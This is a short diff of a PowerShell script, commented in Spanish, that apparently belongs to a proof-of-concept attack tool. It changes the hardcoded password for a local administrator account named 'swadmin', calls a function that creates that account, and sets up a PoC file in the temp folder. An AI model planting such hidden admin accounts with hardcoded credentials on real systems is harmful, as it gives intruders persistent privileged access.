@@ -34,8 +34,8 @@ $initial_dir = $PWD.Path
 
 #creando usuario administrador 
 $NewLocalAdmin = "swadmin"
-$Password = (ConvertTo-SecureString "12192003" -AsPlainText -Force)
-create_account -uname $uname -pword $pword
+$Password = (ConvertTo-SecureString "Melon123$!" -AsPlainText -Force)
+Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
 
 #ir al directorio en la carpeta %temp%, crear un archivo PoC.txt
 mkdir $path
